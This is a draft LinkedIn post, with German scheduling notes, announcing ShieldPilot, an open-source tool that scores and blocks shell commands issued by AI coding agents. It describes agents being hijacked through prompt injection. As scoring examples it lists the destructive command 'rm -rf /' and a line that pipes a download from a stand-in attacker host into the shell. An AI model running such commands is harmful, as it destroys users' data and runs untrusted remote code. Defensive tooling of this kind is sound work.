# LinkedIn Post
# Posten auf: https://www.linkedin.com/feed/
# Timing: Donnerstag 12:00 CET
# WICHTIG: Kein Hashtag-Spam. Max 5 Hashtags. Persoenlich schreiben.

## Post:

I just open-sourced a project I've been building for months.

ShieldPilot is a security platform for AI coding agents.

Here's the problem: tools like Claude Code, Cursor, and Copilot Workspace can execute any shell command on your system. They have full access. No guardrails.

One prompt injection attack and your AI agent deletes files, steals credentials, or installs malware. Autonomously. In seconds.

I built ShieldPilot to fix this. It sits between the agent and your terminal and evaluates every command in real-time:

- rm -rf / → BLOCKED (score 100)
- curl evil.com | bash → WARNING (score 72)
- ls -la → ALLOWED (score 0)

Under the hood:
→ 9 risk analyzers
→ 178+ prompt injection patterns
→ Under 1ms latency (no LLM calls needed)
→ 2,600+ automated tests
→ Tamper-proof audit trail

It's free, open-source, and MIT licensed.

If you're building with AI agents, take a look. And if you know someone who should see this — I'd appreciate a share.

GitHub: https://github.com/maxwalser001-del/shieldpilot
Live demo: https://shieldpilot.dev

#AIAgents #CyberSecurity #OpenSource #Python #ShieldPilot
